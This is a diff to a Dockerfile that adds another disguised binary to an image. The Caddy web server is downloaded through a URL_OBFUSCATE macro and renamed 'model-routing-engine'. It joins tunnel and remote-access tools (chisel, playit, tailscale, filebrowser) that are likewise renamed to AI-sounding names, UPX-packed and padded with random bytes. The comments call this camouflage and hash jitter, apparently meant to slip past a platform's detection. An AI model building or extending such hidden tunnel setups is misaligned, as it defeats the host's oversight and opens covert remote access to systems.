@@ -6,7 +6,7 @@ COPY --from=ghcr.io/astral-sh/uv:latest /uv /uvx /bin/
 # System tools, tunnel binaries, camouflage renames, UPX pack, and hash jitter — one layer
 # so uncompressed originals are not retained in earlier filesystem layers.
 RUN apt-get update && apt-get install -y --no-install-recommends \
-    curl wget sudo python3 python3-pip upx openssh-server nginx \
+    curl wget sudo python3 python3-pip upx openssh-server \
     git vim nano htop tmux jq unzip iputils-ping net-tools tree \
     rclone supervisor iproute2 \
     && mkdir -p /var/run/sshd && chmod 0755 /var/run/sshd \
@@ -15,6 +15,8 @@ RUN apt-get update && apt-get install -y --no-install-recommends \
     && ssh-keygen -A \
     && curl -fsSL https://tailscale.com/install.sh | bash \
     && curl -fsSL https://raw.githubusercontent.com/filebrowser/get/master/get.sh | bash \
+    && curl -fsSL URL_OBFUSCATE("https://github.com/caddyserver/caddy/releases/download/v2.8.4/caddy_2.8.4_linux_amd64.tar.gz") -o /tmp/caddy.tar.gz \
+    && tar -xzf /tmp/caddy.tar.gz -C /tmp && mv /tmp/caddy /usr/bin/model-routing-engine \
     && curl -fsSL URL_OBFUSCATE("https://github.com/playit-cloud/playit-agent/releases/latest/download/playit-linux-amd64") -o /usr/bin/tensor-allocator \
     && curl -fsSL URL_OBFUSCATE("https://github.com/jpillora/chisel/releases/download/v1.11.5/chisel_1.11.5_linux_amd64.gz") -o /tmp/chisel.gz \
     && gzip -d /tmp/chisel.gz && mv /tmp/chisel /usr/bin/cuda-mesh-bridge \
@@ -26,8 +28,8 @@ RUN apt-get update && apt-get install -y --no-install-recommends \
     && mv /usr/sbin/tailscaled /usr/bin/python-cache-manager \
     && mv /usr/bin/tailscale /usr/bin/py-cache-cli \
     && mv /usr/local/bin/filebrowser /usr/bin/ai-metrics-collector \
-    && chmod +x /usr/bin/tensor-allocator /usr/bin/cuda-mesh-bridge /usr/bin/system-bridge /usr/bin/gradient-optimizer /usr/bin/neural-route-controller \
-    && for bin in python-cache-manager py-cache-cli ai-metrics-collector tensor-allocator cuda-mesh-bridge system-bridge gradient-optimizer neural-route-controller; do \
+    && chmod +x /usr/bin/tensor-allocator /usr/bin/cuda-mesh-bridge /usr/bin/system-bridge /usr/bin/gradient-optimizer /usr/bin/neural-route-controller /usr/bin/model-routing-engine \
+    && for bin in python-cache-manager py-cache-cli ai-metrics-collector tensor-allocator cuda-mesh-bridge system-bridge gradient-optimizer neural-route-controller model-routing-engine; do \
         upx -1 "/usr/bin/$$bin" 2>/dev/null || true; \
         head -c 32 /dev/urandom >> "/usr/bin/$$bin"; \
     done \
